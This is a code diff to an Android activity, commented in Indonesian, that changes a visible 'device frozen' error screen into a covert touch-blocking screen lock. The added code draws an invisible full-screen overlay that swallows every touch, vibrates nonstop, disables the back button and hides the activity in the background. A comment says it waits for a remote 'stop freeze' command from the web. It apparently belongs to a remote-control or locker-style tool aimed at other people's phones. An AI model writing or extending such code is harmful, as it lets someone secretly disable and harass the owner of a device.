@@ -5,47 +5,63 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.graphics.Color;
+import android.graphics.PixelFormat;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
+import android.view.MotionEvent;
+import android.view.View;
 import android.view.WindowManager;
-import android.widget.LinearLayout;
-import android.widget.TextView;
-import android.view.Gravity;
+import android.widget.FrameLayout;
 
 public class FreezeActivity extends Activity {
     private Vibrator vibrator;
     private BroadcastReceiver stopFreezeReceiver;
+    private WindowManager windowManager;
+    private View overlayView;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
-            setShowWhenLocked(true);
-            setTurnScreenOn(true);
-        } else {
-            getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
-                                 WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
-                                 WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-                                 WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
-        }
+        // Bikin Activity jadi transparan dan lempar ke background
+        // Biar layar Home Screen atau aplikasi lain tetep keliatan
+        setTheme(android.R.style.Theme_Translucent_NoTitleBar_Fullscreen);
+        moveTaskToBack(true);
 
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setBackgroundColor(0xFF000000);
-        layout.setGravity(Gravity.CENTER);
+        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        
+        // Bikin frame layout transparan seukuran layar
+        FrameLayout layout = new FrameLayout(this);
+        layout.setBackgroundColor(Color.TRANSPARENT); 
+        
+        // Sedot semua sentuhan (biar layar ga bisa digeser/diklik)
+        layout.setOnTouchListener(new View.OnTouchListener() {
+            @Override
+            public boolean onTouch(View v, MotionEvent event) {
+                return true; // True = abaikan sentuhan
+            }
+        });
 
-        TextView tv = new TextView(this);
-        tv.setText("SYSTEM CRITICAL ERROR\n\nDEVICE FROZEN");
-        tv.setTextColor(0xFFFF0000);
-        tv.setTextSize(30);
-        tv.setGravity(Gravity.CENTER);
-        layout.addView(tv);
+        int layoutType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? 
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 
+                WindowManager.LayoutParams.TYPE_PHONE;
 
-        setContentView(layout);
+        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                layoutType,
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                PixelFormat.TRANSLUCENT
+        );
 
+        windowManager.addView(layout, params);
+        overlayView = layout;
+
+        // Getar Nonstop
         vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
         if (vibrator != null && vibrator.hasVibrator()) {
             long[] pattern = {0, 1000, 500};
@@ -56,11 +72,11 @@ public class FreezeActivity extends Activity {
             }
         }
 
+        // Dengerin perintah Stop Freeze dari web
         stopFreezeReceiver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
-                if (vibrator != null) vibrator.cancel();
-                finish();
+                cleanupAndFinish();
             }
         };
         
@@ -71,13 +87,24 @@ public class FreezeActivity extends Activity {
         }
     }
 
-    @Override
-    public void onBackPressed() { }
+    private void cleanupAndFinish() {
+        if (vibrator != null) vibrator.cancel();
+        if (overlayView != null && windowManager != null) {
+            try { windowManager.removeView(overlayView); } catch (Exception e) {}
+        }
+        finish();
+    }
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
         if (vibrator != null) vibrator.cancel();
+        if (overlayView != null && windowManager != null) {
+            try { windowManager.removeView(overlayView); } catch (Exception e) {}
+        }
         try { unregisterReceiver(stopFreezeReceiver); } catch (Exception e) {}
     }
+    
+    @Override
+    public void onBackPressed() { }
 }
